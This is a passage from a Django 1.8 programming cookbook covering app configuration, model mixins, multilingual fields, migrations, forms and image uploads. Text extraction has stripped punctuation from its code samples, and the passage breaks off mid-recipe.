signals.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db.models.signals import post_save, post_delete from django.dispatch import receiver from django.conf import settings from .models import NewsArticle  @receiver post_save, sender=NewsArticle  def news_save_handler sender, **kwargs :     if settings.DEBUG:         print "%s saved." % kwargs['instance']   @receiver post_delete, sender=NewsArticle   175  Chapter 1   def news_delete_handler sender, **kwargs :     if settings.DEBUG:         print "%s deleted." % kwargs['instance']   How it works… When you run an HTTP server or invoke a management command, django.setup   is  called. It loads the settings, sets up logging, and initializes app registry. The app registry is  initialized in three steps, as shown in the following:   f Django imports the configurations for each item from INSTALLED_APPS in   the settings. These items can point to app names or configuration directly, for  example,"magazine" or "magazine.apps.NewsAppConfig".   f Django tries to import models.py from each app in INSTALLED_APPS and collect   all the models.   f Finally, Django runs the ready   method for each app configuration. This method   is a correct place to register signal handlers, if you have any. The ready   method   is optional.   f In our example, the MagazineAppConfig class sets the configuration for the  magazine app. The name parameter defines the name of the current app. The  verbose_name parameter is used in the Django model administration, where  models are presented and grouped by apps. The ready   method imports and  activates the signal handlers that, when in DEBUG mode, print in the terminal   that a NewsArticle was saved or deleted.  There is more… After calling django.setup  , you can load the app configurations and models from the  registry as follows:  >>> from django.apps import apps as django_apps  >>> magazine_app_config = django_apps.get_app_config "magazine"   >>> magazine_app_config     >>> magazine_app_config.models_module     NewsArticle = django_apps.get_model "magazine", "NewsArticle"   You can read more about app configuration in the official Django documentation at   https:  docs.djangoproject.com en 1.8 ref applications   176  Getting Started with Django 1.8   See also   f The Working with a virtual environment recipe  f The Defining overwritable app settings recipe  f Chapter 6, Model Administration  Defining overwritable app settings This recipe will show you how to define settings for your app that can be then overwritten  in your project's settings.py or local_settings.py file. This is useful especially for  reusable apps.  Getting ready Either create your Django app manually or using the following command:   myproject_env $ django-admin.py startapp myapp1  How to do it… If you just have one or two settings, you can use the following pattern in your models.py   file. If the settings are extensive and you want to have them organized better, create an   app_settings.py file in the app and put the settings in the following way:   models.py or app_settings.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf import settings from django.utils.translation import ugettext_lazy as _  SETTING1 = getattr settings, "MYAPP1_SETTING1", u"default value"  MEANING_OF_LIFE = getattr settings, "MYAPP1_MEANING_OF_LIFE", 42  STATUS_CHOICES = getattr settings, "MYAPP1_STATUS_CHOICES",        "draft", _ "Draft"  ,      "published", _ "Published"  ,      "not_listed", _ "Not Listed"  ,     177  Chapter 1   Then, you can use the app settings in models.py, as follows:   models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _  from .app_settings import STATUS_CHOICES  class NewsArticle models.Model :      …     status = models.CharField _ "Status" ,         max_length=20, choices=STATUS_CHOICES        If you want to overwrite the STATUS_CHOICES setting for just one project, you simply open  settings.py and add the following:   settings.py  … from django.utils.translation import ugettext_lazy as _ MYAPP1_STATUS_CHOICES =        "imported", _ "Imported"  ,      "draft", _ "Draft"  ,      "published", _ "Published"  ,      "not_listed", _ "Not Listed"  ,      "expired", _ "Expired"  ,    How it works… The getattr object, attribute_name[, default_value]  Python function tries  to get the attribute_name attribute from object and returns default_value if it is not  found. In this case, different settings are tried in order to be taken from the Django project  settings module, and if they are not found, the default values are assigned.  178  Getting Started with Django 1.8   Database Structure  In this chapter, we will cover the following topics:   f Using model mixins  f Creating a model mixin with URL-related methods  f Creating a model mixin to handle creation and modification dates  f Creating a model mixin to take care of meta tags  f Creating a model mixin to handle generic relations  f Handling multilingual fields  f Using migrations  f Switching from South migrations to Django migrations  f Changing a foreign key to the many-to-many field  Introduction When you start a new app, the first thing to do is create the models that represent your  database structure. We are assuming that you have previously created Django apps or at  least, you have read and understood the official Django tutorial. In this chapter, we will see a  few interesting techniques that make your database structure consistent throughout different  apps in your project. Then, we will see how to create custom model fields in order to handle  internationalization of your data in the database. At the end of the chapter, we will see how to  use migrations to change your database structure in the process of development.  2  179   Using model mixins In object-oriented languages, such as Python, a mixin class can be viewed as an interface  with implemented features. When a model extends a mixin, it implements the interface and  includes all its fields, properties, and methods. Mixins in Django models can be used when  you want to reuse the generic functionalities in different models multiple times.  Getting ready First, you will need to create reusable mixins. Some typical examples of mixins are given later  in this chapter. A good place to keep your model mixins is in the utils module.  If you create a reusable app that you will share with others,  keep the model mixins in the reusable app, for example, in  the base.py file.  How to do it… Open the models.py file of any Django app, where you want to use the mixins and type the  following code:   demo_app models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible from utils.models import UrlMixin from utils.models import CreationModificationMixin from utils.models import MetaTagsMixin  @python_2_unicode_compatible class Idea UrlMixin, CreationModificationMixin, MetaTagsMixin :   title = models.CharField _ "Title" , max_length=200    content = models.TextField _ "Content"      class Meta:     verbose_name = _ "Idea"      verbose_name_plural = _ "Ideas"     def __str__ self :     return self.title  180  Database Structure   How it works… Django model inheritance supports three types of inheritance: abstract base classes,  multi-table inheritance, and proxy models. Model mixins are abstract model classes  with specified fields, properties, and methods. When you create a model such as  Idea, as shown in the preceding example, it inherits all the features from UrlMixin,  CreationModificationMixin, and MetaTagsMixin. All the fields of the abstract classes  are saved in the same database table as the fields of the extending model. In the following  recipes, you will learn how to define your model mixins.  Note that we are using the @python_2_unicode_compatible decorator for our Idea model.  As you might remember from the Making your code compatible with both Python 2.7 and   Python 3 recipe in Chapter 1, Getting Started with Django 1.8, it's purpose is to make the   __str__   method compatible with Unicode for both the following Python versions: 2.7 and 3.  There's more… To learn more about the different types of model inheritance, refer to the official Django  documentation available at https:  docs.djangoproject.com en 1.8 topics db  models model-inheritance.

This method can be used in templates and also in the Django admin site to  preview the saved object. However, get_absolute_url   is ambiguous as it returns the  URL path instead of the full URL. In this recipe, we will see how to create a model mixin that  allows you to define either the URL path or the full URL by default, generate the other out of  the box, and take care of the get_absolute_url   method that is being set.  181  Chapter 2   Getting ready If you haven't done it yet, create the utils package to save your mixins. Then, create the  models.py file in the utils package  alternatively, if you create a reusable app, put the   mixins in the base.py file in your app .

The get_url   or get_url_path   methods are  expected to be overwritten in the extended model class, for example, Idea. You can define  get_url  , which is the full URL of the object, and then get_url_path   will strip it to  the path. You can also define get_url_path  , which is the absolute path of the object,  and then get_url   will prepend the website URL to the beginning of the path. The get_ absolute_url   method will mimic the get_url_path   method.  The rule of thumb is to always overwrite the get_url_ path   method.  In the templates, use  {{ idea.title }}<  a> when you need a link of an object in the same website. Use <a href="{{  idea.get_ url }}">{{ idea.title }}  for the links in e-mails, RSS feeds, or APIs.  The default get_absolute_url   method will be used in the Django model administration  for the View on site functionality and might also be used by some third-party Django apps.

In this recipe, we will see how to create a simple model mixin that  saves the creation and modification dates and times for your model. Using such a mixin will  ensure that all the models use the same field names for the timestamps and have the   same behavior.  Getting ready If you haven't done this yet, create the utils package to save your mixins. Then, create the  models.py file in the utils package.  184  Database Structure   How to do it… Open the models.py file of your utils package and insert the following content there:   utils models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.timezone import now as timezone_now  class CreationModificationDateMixin models.Model :   """   Abstract base class with a creation and modification   date and time   """    created = models.DateTimeField      _ "creation date and time" ,     editable=False,        modified = models.DateTimeField      _ "modification date and time" ,     null=True,     editable=False,        def save self, *args, **kwargs :     if not self.pk:       self.created = timezone_now       else:        To ensure that we have a creation data always,        we add this one     if not self.created:       self.created = timezone_now          self.modified = timezone_now          super CreationModificationDateMixin, self .\       save *args, **kwargs      save.alters_data = True    class Meta:     abstract = True  185  Chapter 2   How it works… The CreationModificationDateMixin class is an abstract model, which means that  extending model classes will create all the fields in the same database table, that is, there will  be no one-to-one relationships that make the table difficult to handle. This mixin has two date- time fields and the save   method that will be called when saving the extended model. The  save   method checks whether the model has no primary key, which is the case of a new  not-yet-saved instance. In this case, it sets the creation date to the current date and time. If  the primary key exists, the modification date is set to the current date and time.  Alternatively, instead of the save   method, you can use the auto_now_add and auto_ now attributes for the created and modified fields, which will add creation and modification  timestamps automatically.

For maximum flexibility, you need  to have a way to define specific meta tags for each object, which has its own page on your  website. In this recipe, we will see how to create a model mixin for the fields and methods  related to the meta tags.

The methods to render the meta   tags in HTML are also added.  If you use this mixin in a model such as Idea, which is shown in the first recipe of this  chapter, then you can put the following in the HEAD section of your detail page template   to render all the meta tags:  {{ idea.get_meta_tags }}  You can also render a specific meta tag using the following line:  {{ idea.get_meta_description }}  As you may have noticed from the code snippet, the rendered meta tags are marked as safe,  that is, they are not escaped and we don't need to use the safe template filter. Only the   values that come from the database are escaped in order to guarantee that the final HTML   is well-formed.  188  Database Structure   See also   f The Using model mixins recipe  f The Creating a model mixin to handle creation and modification dates recipe  f The Creating a model mixin to handle generic relations recipe  Creating a model mixin to handle generic  relations Besides normal database relationships such as a foreign-key relationship or many-to-many  relationship, Django has a mechanism to relate a model to an instance of any other model.  This concept is called generic relations. For each generic relation, there is a content type of  the related model that is saved as well as the ID of the instance of this model.  In this recipe, we will see how to generalize the creation of generic relations in the model mixins.  Getting ready For this recipe to work, you need to have the contenttypes app installed. It should be in the  INSTALLED_APPS directory by default, as shown in the following:   settings.py INSTALLED_APPS =        …     "django.contrib.contenttypes",    Again, make sure that you have the utils package for your model mixins already created.

The following is an example of how to use two generic relationships in your app  put   this code in demo_app models.py , as shown in the following:  demo_app models.py  -*- coding: UTF-8 -*- from __future__ import nicode_literals from django.db import models from utils.models import object_relation_mixin_factory from django.utils.encoding import python_2_unicode_compatible  FavoriteObjectMixin = object_relation_mixin_factory      is_required=True,    OwnerMixin = object_relation_mixin_factory      prefix="owner",     prefix_verbose=_ "Owner" ,     add_related_name=True,     limit_content_type_choices_to={         'model__in':  'user', 'institution'      },  192  Database Structure       is_required=True,    @python_2_unicode_compatible class Like FavoriteObjectMixin, OwnerMixin :     class Meta:         verbose_name = _ "Like"          verbose_name_plural = _ "Likes"       def __str__ self :         return _ "% owner s likes % obj s"  % {             "owner": self.owner_content_object,             "obj": self.content_object,         }  How it works… As you can see, this snippet is more complex than the previous ones. The object_ relation_mixin_factory object is not a mixin itself; it is a function that generates a  model mixin, that is, an abstract model class to extend from. The dynamically created mixin  adds the content_type and object_id fields and the content_object generic foreign  key that points to the related instance.  Why couldn't we just define a simple model mixin with these three attributes? A dynamically  generated abstract class allows us to have prefixes for each field name; therefore, we can  have more than one generic relation in the same model. For example, the Like model, which  was shown previously, will have the content_type, object_id, and content_object  fields for the favorite object and owner_content_type, owner_object_id, and owner_ content_object for the one  user or institution  who liked the object.  The object_relation_mixin_factory   function adds a possibility to limit the content  type choices by the limit_content_type_choices_to parameter. The preceding  example limits the choices for owner_content_type only to the content types of the User  and Institution models. Also, there is the limit_object_choices_to parameter that  can be used by custom form validation to limit the generic relations only to specific objects, for  example, the objects with published status.

However, it's up to the developer to decide how to implement the multilingual  content in the models. There are several third-party modules that handle translatable model  fields; however, I prefer the simple solution that will be introduced to you in this recipe.  The advantages of the approach that you will learn about are as follows:   f It is straightforward to define multilingual fields in the database  f It is simple to use the multilingual fields in database queries  f You can use contributed administration to edit models with the multilingual fields   without additional modifications   f If you need it, you can easily show all the translations of an object in the    same template   f You can use database migrations to add or remove languages  Getting ready Do you have the utils package created? You will now need a new fields.py file for the  custom model fields there.  How to do it… Execute the following steps to define the multilingual character field and multilingual text field:  1.  Open the fields.py file and create the multilingual character field as follows:   utils fields.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf import settings from django.db import models from django.utils.translation import get_language from django.utils.translation import string_concat  class MultilingualCharField models.CharField :    def __init__ self, verbose_name=None, **kwargs :      self._blank = kwargs.get "blank", False   194  Database Structure       self._editable = kwargs.get "editable", True       super MultilingualCharField, self .\       __init__ verbose_name, **kwargs     def contribute_to_class self, cls, name,     virtual_only=False :      generate language specific fields dynamically     if not cls._meta.abstract:       for lang_code, lang_name in settings.LANGUAGES:         if lang_code == settings.LANGUAGE_CODE:           _blank = self._blank         else:           _blank = True          localized_field = models.CharField            string_concat self.verbose_name,              "  %s " % lang_code ,               name=self.name,                 primary_key=self.primary_key,                 max_length=self.max_length,                 unique=self.unique,                 blank=_blank,                 null=False,                  we ignore the null argument!                 db_index=self.db_index,                 rel=self.rel,                 default=self.default or "",                 editable=self._editable,                 serialize=self.serialize,                 choices=self.choices,                 help_text=self.help_text,                 db_column=None,                 db_tablespace=self.db_tablespace                   localized_field.contribute_to_class            cls,           "%s_%s" %  name, lang_code ,                    def translated_value self :           language = get_language             val = self.__dict__["%s_%s" %  name, language ]           if not val:  195  Chapter 2               val = self.__dict__["%s_%s" % \                name, settings.LANGUAGE_CODE ]               return val        setattr cls, name, property translated_value    2.

Then, create the multilingual fields for your model, as follows:   demo_app models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import \     python_2_unicode_compatible  from utils.fields import MultilingualCharField  197  Chapter 2   from utils.fields import MultilingualTextField  @python_2_unicode_compatible class Idea models.Model :     title = MultilingualCharField          _ "Title" ,         max_length=200,           description = MultilingualTextField          _ "Description" ,         blank=True,            class Meta:         verbose_name = _ "Idea"          verbose_name_plural = _ "Ideas"       def __str__ self :         return self.title  How it works… The example of Idea will create a model that is similar to the following:  class Idea models.Model :   title_en = models.CharField      _ "Title  en " ,     max_length=200,       title_de = models.CharField      _ "Title  de " ,     max_length=200,     blank=True,       title_fr = models.CharField      _ "Title  fr " ,     max_length=200,     blank=True,       title_lt = models.CharField      _ "Title  lt " ,     max_length=200,     blank=True,      198  Database Structure     description_en = models.TextField      _ "Description  en " ,     blank=True,       description_de = models.TextField      _ "Description  de " ,     blank=True,       description_fr = models.TextField      _ "Description  fr " ,     blank=True,       description_lt = models.TextField      _ "Description  lt " ,     blank=True,      In addition to this, there will be two properties: title and description that will return the  title and description in the currently active language.  The MultilingualCharField and MultilingualTextField fields will juggle the  model fields dynamically, depending on your LANGUAGES setting. They will overwrite the  contribute_to_class   method that is used when the Django framework creates  the model classes. The multilingual fields dynamically add character or text fields for each  language of the project. Also, the properties are created in order to return the translated value  of the currently active language or the main language by default.  For example, you can have the following in the template:   {{ idea.title }}   {{ idea.descriptionurlizelinebreaks }}   This will show the text in English, German, French, or Lithuanian, depending on the currently  selected language. However, it will fall back to English if the translation doesn't exist.  Here is another example. If you want to have your QuerySet ordered by the translated titles  in the view, you can define it as follows:  qs = Idea.objects.order_by "title_%s" % request.LANGUAGE_CODE   199  Chapter 2   Using migrations It is not true that once you have created your database structure, it won't change in the future.  As development happens iteratively, you can get updates on the business requirements in the  development process and you will need to perform database schema changes along the way.  With the Django migrations, you don't need to change the database tables and fields manually,  as most of it is done automatically using the command-line interface.  Getting ready Activate your virtual environment in the command-line tool.  How to do it… To create the database migrations, take a look at the following steps:  1.  When you create models in your new demo_app app, you need to create an initial  migration that will create the database tables for your app. This can be done using  the following command:  myproject_env $ python manage.py makemigrations demo_app  2.  The first time that you want to create all the tables for your project, run the following   command:  myproject_env $ python manage.py migrate  It executes the usual database synchronization for all apps that have no database  migrations, and in addition to this, it migrates all apps that have the migrations set.  Also, run this command when you want to execute the new migrations for all your apps.  If you want to execute the migrations for a specific app, run the following command:  myproject_env $ python manage.py migrate demo_app  If you make some changes in the database schema, you have to create a migration  for that schema. For example, if we add a new subtitle field to the Idea model, we  can create the migration using the following command:  myproject_env $ python manage.py makemigrations --name \  subtitle_added demo_app  5.  To create a data migration that modifies the data in the database table, we can use   the following command:  myproject_env $ python manage.py makemigrations --empty \   --name populate_subtitle demo_app  3.   4.   200  Database Structure   This creates a skeleton data migration, which you need to modify and add data  manipulation to it before applying.  6.  To list all the available applied and unapplied migrations, run the following command:   myproject_env $ python manage.py migrate --list  The applied migrations will be listed with a [X] prefix.  7.  To list all the available migrations for a specific app, run the following command:   myproject_env $ python manage.py migrate --list demo_app  How it works… Django migrations are instruction files for the database migration mechanism. The instruction  files inform us which database tables to create or remove; which fields to add or remove; and  which data to insert, update, or delete.  There are two types of migrations in Django. One is schema migration and the other is data  migration. Schema migration should be created when you add new models, or add or remove  fields. Data migration should be used when you want to fill the database with some values  or massively delete values from the database. Data migrations should be created using a  command in the command-line tool and then programmed in the migration file. Migrations  for each app are saved in their migrations directories. The first migration will be usually  called 0001_initial.py, and the other migrations in our example app will be called 0002_ subtitle_added.py and 0003_populate_subtitle.py. Each migration gets a number  prefix that is automatically incremented. For each migration that is executed, there is an entry  that is saved in the django_migrations database table.  It is possible to migrate back and forth by specifying the number of the migration to which we  want to migrate to, as shown in the following:   myproject_env $ python manage.py migrate demo_app 0002  If you want to undo all the migrations for a specific app, you can do so using the following  command:   myproject_env $ python manage.py migrate demo_app zero  Do not commit your migrations to version control until you have  tested the forward and backward migration process and you are  sure that they will work well in other development and public  website environments.  201  Chapter 2   See also   f The Handling project dependencies with pip and Including external dependencies in   your project recipes in Chapter 1, Getting Started with Django 1.8   f The Changing a foreign key to the many-to-many field recipe  Switching from South migrations to Django  migrations If you, like me, have been using Django since before database migrations existed in the  core functionality, that is, before Django 1.7; you have, more than likely, used third-party  South migrations before. In this recipe, you will learn how to switch your project from South  migrations to Django migrations.  Getting ready Make sure that all apps and their South migrations are up to date.  How to do it… Execute the following steps:  1.  Migrate all your apps to the latest South migrations, as follows:   myproject_env $ python manage.py migrate  2.  Remove south from INSTALLED_APPS in the settings. 3.  For each app with South migrations, delete the migration files and only leave the   migrations directories.  4.  Create new migration files with the following command:   my_project $ python manage.py makemigrations  5.  Fake the initial Django migrations as the database schema has already been    set correctly:  my_project $ python manage.py migrate --fake-initial  6.   If you have any circular foreign keys in the apps  that is, two models in different apps  pointing to each other with a foreign key or many-to-many relation , separately apply  the fake initial migrations to these apps:  my_project $ python manage.py migrate --fake-initial demo_app  202  Database Structure   How it works… There is no conflict in the database when switching to the new way of dealing with  the database schema changes as the South migration history is saved in the south_ migrationhistory database table; whereas, the Django migration history is saved in the  django_migrations database table. The only problem are the migration files that have  different syntax and, therefore, the South migrations need to be completely replaced with the  Django migrations.  Therefore, at first, we delete the South migration files. Then, the makemigrations command  recognizes the empty migrations directories and creates new initial Django migrations for  each app. Once these migrations are faked, the further Django migrations can be created   and applied.  See also   f The Using migrations recipe  f The Changing a foreign key to the many-to-many field recipe  Changing a foreign key to the many-to-many  field This recipe is a practical example of how to change a many-to-one relation to many-to-many  relation, while preserving the already existing data. We will use both schema and data  migrations for this situation.  Getting ready Let's consider that you have the Idea model with a foreign key pointing to the Category  model, as follows:   demo_app models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  @python_2_unicode_compatible class Category models.Model :  203  Chapter 2       title = models.CharField _ "Title" , max_length=200       def __str__ self :         return self.title  @python_2_unicode_compatible class Idea models.Model :     title = model.CharField _ "Title" , max_length=200      category = models.ForeignKey Category,         verbose_name=_ "Category" ,  null=True, blank=True       def __str__ self :         return self.title  The initial migration should be created and executed using the following commands:   myproject_env $ python manage.py makemigrations demo_app   myproject_env $ python manage.py migrate demo_app  How to do it… The following steps will teach you how to switch from a foreign key relation to many-to-many  relation, while preserving the already existing data:  1.  Add a new many-to-many field called categories, as follows:   demo_app models.py @python_2_unicode_compatible class Idea models.Model :     title = model.CharField _ "Title" , max_length=200      category = models.ForeignKey Category,         verbose_name=_ "Category" ,         null=True,         blank=True,           categories = models.ManyToManyField Category,          verbose_name=_ "Categories" ,         blank=True,          related_name="ideas",        2.  Create and run a schema migration in order to add the new field to the database, as   shown in the following:  myproject_env $ python manage.py makemigrations demo_app \  --name categories_added   myproject_env $ python manage.py migrate demo_app  204  Database Structure   3.  Create a data migration to copy categories from the foreign key to the many-to-many   field, as follows:  myproject_env $ python manage.py makemigrations --empty \  --name copy_categories demo_app  4.  Open the newly created migration file  demo_app migrations 0003_copy_ categories.py  and define the forward migration instructions, as shown in   the following:  demo_app migrations 0003_copy_categories.py  -*- coding: utf-8 -*- from __future__ import unicode_literals from django.db import models, migrations  def copy_categories apps, schema_editor :     Idea = apps.get_model "demo_app", "Idea"      for idea in Idea.objects.all  :         if idea.category:             idea.categories.add idea.category   class Migration migrations.Migration :      dependencies = [          'demo_app', '0002_categories_added' ,     ]      operations = [         migrations.RunPython copy_categories ,     ]  5.  Run the following data migration:   myproject_env $ python manage.py migrate demo_app  6.  Delete the foreign key field category in the models.py file:   demo_app models.py @python_2_unicode_compatible class Idea models.Model :     title = model.CharField _ "Title" , max_length=200      categories = models.ManyToManyField Category,         verbose_name=_ "Categories" ,         blank=True,         related_name="ideas",        205  Chapter 2   7.  Create and run a schema migration in order to delete the categories field from the   database table, as follows:  myproject_env $ python manage.py schemamigration \  --name delete_category demo_app   myproject_env $ python manage.py migrate demo_app  How it works… At first, we add a new many-to-many field to the Idea model. Then, we copy the existing  relations from a foreign key relation to the many-to-many relation. Lastly, we remove the  foreign key relation.  See also   f The Using migrations recipe  f The Switching from South migrations to Django migrations recipe  206  Database Structure   3  Forms and Views  In this chapter, we will cover the following topics:   f Passing HttpRequest to the form  f Utilizing the save method of the form  f Uploading images  f Creating form layout with django-crispy-forms  f Downloading authorized files  f Filtering object lists  f Managing paginated lists  f Composing class-based views  f Generating PDF documents  f Implementing a multilingual search with Haystack  Introduction When the database structure is defined in the models, we need some views to let the users  enter data or show the data to the people. In this chapter, we will focus on the views managing  forms, the list view, and views generating an alternative output than HTML. For the simplest  examples, we will leave the creation of URL rules and templates up to you.  207   Passing HttpRequest to the form The first argument of every Django view is the HttpRequest object that is usually named  request. It contains metadata about the request. For example, current language code,  current user, current cookies, and current session. By default, the forms that are used in the  views accept the GET or POST parameters, files, initial data, and other parameters; however,  not the HttpRequest object. In some cases, it is useful to additionally pass HttpRequest  to the form, especially when you want to filter out the choices of form fields using the request  data or handle saving something such as the current user or IP in the form.  In this recipe, we will see an example of a form where a person can choose a user and   write a message to them. We will pass the HttpRequest object to the form in order   to exclude the current user from the recipient choices; we don't want anybody to write   a message to themselves.  Getting ready Let's create a new app called email_messages and put it in INSTALLED_APPS in the  settings. This app will have no models, just forms and views.  How to do it… To complete this recipe, execute the following steps:  1.  Add a new forms.py file with the message form containing two fields: the recipient   selection and message text. Also, this form will have an initialization method,  which will accept the request object and then, modify QuerySet for the recipient's  selection field:  email_messages forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import forms from django.utils.translation import ugettext_lazy as _ from django.contrib.auth.models import User  class MessageForm forms.Form :     recipient = forms.ModelChoiceField          label=_ "Recipient" ,         queryset=User.objects.all  ,         required=True,           message = forms.CharField          label=_ "Message" ,  208  Forms and Views           widget=forms.Textarea,         required=True,            def __init__ self, request, *args, **kwargs :         super MessageForm, self .__init__ *args, **kwargs          self.request = request         self.fields["recipient"].queryset = \             self.fields["recipient"].queryset.\             exclude pk=request.user.pk   2.  Then, create views.py with the message_to_user   view in order to handle the  form. As you can see, the request object is passed as the first parameter to the form,  as follows:  email_messages views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib.auth.decorators import login_required from django.shortcuts import render, redirect  from .forms import MessageForm  @login_required def message_to_user request :     if request.method == "POST":         form = MessageForm request, data=request.POST          if form.is_valid  :              do something with the form             return redirect "message_to_user_done"      else:         form = MessageForm request       return render request,         "email_messages message_to_user.html",         {"form": form}        209  Chapter 3   How it works… In the initialization method, we have the self variable that represents the instance of the  form itself, we also have the newly added request variable, and then we have the rest of  the positional arguments  *args  and named arguments  **kwargs . We call the super    initialization method passing all the positional and named arguments to it so that the form is  properly initiated. We will then assign the request variable to a new request attribute of the  form for later access in other methods of the form. Then, we modify the queryset attribute of  the recipient's selection field, excluding the current user from the request.  In the view, we will pass the HttpRequest object as the first argument in both situations:  when the form is posted, as well as when it is loaded for the first time.  See also   f The Utilizing the save method of the form recipe  Utilizing the save method of the form To make your views clean and simple, it is good practice to move the handling of the form  data to the form itself whenever possible and makes sense. The common practice is to have a  save   method that will save the data, perform search, or do some other smart actions. We  will extend the form that is defined in the previous recipe with the save   method, which will  send an e-mail to the selected recipient.  Getting ready We will build upon the example that is defined in the Passing HttpRequest to the form recipe.  How to do it… To complete this recipe, execute the following two steps:  1.  From Django, import the function in order to send an e-mail. Then, add the save    method to MessageForm. It will try to send an e-mail to the selected recipient and  will fail silently if any errors occur:  email_messages forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import forms from django.utils.translation import ugettext,\  210  Forms and Views       ugettext_lazy as _ from django.core.mail import send_mail from django.contrib.auth.models import User  class MessageForm forms.Form :     recipient = forms.ModelChoiceField          label=_ "Recipient" ,         queryset=User.objects.all  ,         required=True,           message = forms.CharField          label=_ "Message" ,         widget=forms.Textarea,         required=True,            def __init__ self, request, *args, **kwargs :         super MessageForm, self .__init__ *args, **kwargs          self.request = request         self.fields["recipient"].queryset = \             self.fields["recipient"].queryset.\             exclude pk=request.user.pk       def save self :         cleaned_data = self.cleaned_data         send_mail              subject=ugettext "A message from %s"  % \                 self.request.user,             message=cleaned_data["message"],             from_email=self.request.user.email,             recipient_list=[                 cleaned_data["recipient"].email             ],             fail_silently=True,            2.  Then, call the save   method from the form in the view if the posted data is valid:   email_messages views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.contrib.auth.decorators import login_required  211  Chapter 3   from django.shortcuts import render, redirect  from .forms import MessageForm  @login_required def message_to_user request :     if request.method == "POST":         form = MessageForm request, data=request.POST          if form.is_valid  :             form.save               return redirect "message_to_user_done"      else:         form = MessageForm request       return render request,         "email_messages message_to_user.html",                  {"form": form}        How it works… Let's take a look at the form. The save   method uses the cleaned data from the form  to read the recipient's e-mail address and the message. The sender of the e-mail is the  current user from the request. If the e-mail cannot be sent due to an incorrect mail server  configuration or another reason, it will fail silently; that is, no error will be raised.  Now, let's look at the view. When the posted form is valid, the save   method of the form will  be called and the user will be redirected to the success page.

You will see an  example of an app, where the visitors can upload images with inspirational quotes.  Getting ready Make sure to have Pillow or PIL installed in your virtual environment or globally.  212  Forms and Views   Then, let's create a quotes app and put it in INSTALLED_APPS in the settings. Then, we  will add an InspirationalQuote model with three fields: the author, quote text, and  picture, as follows:   quotes models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.db import models from django.utils.timezone import now as timezone_now from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  def upload_to instance, filename :     now = timezone_now       filename_base, filename_ext = os.path.splitext filename      return "quotes %s%s" %           now.strftime "%Y %m %Y%m%d%H%M%S" ,         filename_ext.lower  ,            @python_2_unicode_compatible class InspirationalQuote models.Model :     author = models.CharField _ "Author" , max_length=200      quote = models.TextField _ "Quote"       picture = models.ImageField _ "Picture" ,         upload_to=upload_to,         blank=True,         null=True,                class Meta:         verbose_name = _ "Inspirational Quote"          verbose_name_plural = _ "Inspirational Quotes"               def __str__ self :         return self.quote  In addition, we created an upload_to   function, which sets the path of the uploaded  picture to be something similar to quotes 2015 04 20150424140000.png. As you can  see, we use the date timestamp as the filename to ensure its uniqueness. We pass this  function to the picture image field.  213  Chapter 3   How to do it… Execute these steps to complete the recipe:  1.  Create the forms.py file and put a simple model form there:   quotes forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import forms from .models import InspirationalQuote  class InspirationalQuoteForm forms.ModelForm :     class Meta:         model = InspirationalQuote         fields = ["author", "quote", "picture", "language"]  2.   In the views.py file, put a view that handles the form. Don't forget to pass the  FILES dictionary-like object to the form. When the form is valid, trigger the save  method as follows:  quotes views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.shortcuts import redirect from django.shortcuts import render from .forms import InspirationalQuoteForm  def add_quote request :     if request.method == "POST":         form = InspirationalQuoteForm              data=request.POST,             files=request.FILES,                   if form.is_valid  :             quote = form.save               return redirect "add_quote_done"      else:         form = InspirationalQuoteForm       return render request,         "quotes change_quote.html",         {"form": form}        214  Forms and Views   3.  Lastly, create a template for the view in templates quotes change_quote.  html. It is very important to set the enctype attribute to multipart form-data  for the HTML form, otherwise the file upload won't work: { templates quotes change_quote.html } {% extends "base.html" %} {% load i18n %}  {% block content %}               {% csrf_token %}         {{ form.as_p }}          {% trans "Save" %}        {% endblock %}  How it works… Django model forms are forms that are created from models. They provide all the fields from  the model so you don't need to define them again. In the preceding example, we created a  model form for the InspirationalQuote model. When we save the form, the form knows  how to save each field in the database, as well as to upload the files and save them in the  media directory.  There's more As a bonus, we will see an example of how to generate a thumbnail out of the uploaded  image. Using this technique, you could also generate several other specific versions of the  image, such as the list version, mobile version, and desktop computer version.  We will add three methods to the InspirationalQuote model  quotes models.py .  They are save  , create_thumbnail  , and get_thumbnail_picture_url  . When  the model is being saved, we will trigger the creation of the thumbnail. When we need to  show the thumbnail in a template, we can get its URL using {{ quote.get_thumbnail_ picture_url }}. The method definitions are as follows:   quotes models.py  … from PIL import Image from django.conf import settings from django.core.files.storage import default_storage as storage THUMBNAIL_SIZE = getattr      settings,     "QUOTES_THUMBNAIL_SIZE",      50, 50   215  Chapter 3      class InspirationalQuote models.Model :      …     def save self, *args, **kwargs :         super InspirationalQuote, self .save *args, **kwargs           generate thumbnail picture version         self.create_thumbnail        def create_thumbnail self :         if not self.picture:             return ""         file_path = self.picture.name         filename_base, filename_ext = os.path.splitext file_path          thumbnail_file_path = "%s_thumbnail.jpg" % filename_base         if storage.exists thumbnail_file_path :              if thumbnail version exists, return its url path             return "exists"         try:              resize the original image and              return URL path of the thumbnail version             f = storage.open file_path, 'r'              image = Image.open f              width, height = image.size              if width > height:                 delta = width - height                 left = int delta 2                  upper = 0                 right = height + left                 lower = height             else:                 delta = height - width                 left = 0                 upper = int delta 2                  right = width                 lower = width + upper              image = image.crop  left, upper, right, lower               image = image.resize 